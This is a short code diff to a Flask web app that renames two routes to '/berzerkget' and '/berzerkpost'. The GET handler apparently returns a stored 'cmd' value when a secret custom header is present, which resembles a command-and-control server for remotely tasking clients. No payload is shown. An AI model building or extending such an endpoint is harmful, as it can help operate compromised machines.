@@ -10,7 +10,7 @@ try:
 except:
     sys.exit(1)
 
-@app.route("/4ee2ce1e")
+@app.route("/berzerkget")
 def hello_world():
     obj1 = request.headers.get('X-1412-93e6')
     # print(obj1)
@@ -22,7 +22,7 @@ def hello_world():
         return cmd
     return 'None'
 
-@app.route("/97c9c56e", methods = ["POST"])
+@app.route("/berzerkpost", methods = ["POST"])
 def handle_post_request():
     try:
         # Get the request body as string
